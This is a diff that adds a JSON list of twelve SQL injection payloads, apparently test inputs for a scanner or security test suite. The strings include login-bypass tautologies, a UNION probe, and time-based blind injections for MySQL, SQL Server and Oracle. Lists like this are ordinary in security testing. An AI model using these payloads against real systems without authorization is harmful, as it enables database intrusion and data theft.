@@ -1,0 +1,14 @@
+[
+    "' OR '1'='1' -- ",
+    "\" OR \"1\"=\"1\" -- ",
+    "' OR SLEEP(10)-- ",
+    "' AND 1=0 UNION SELECT NULL-- ",
+    "' OR 1=1#",
+    "' OR 1=1--",
+    "' OR 1=1/*",
+    "' OR 'a'='a",
+    "' OR 1=1 LIMIT 1;--",
+    "' AND SLEEP(5)-- ",
+    "'; WAITFOR DELAY '0:0:10'--",
+    "' AND 1=dbms_pipe.receive_message('a',10)--"
+]
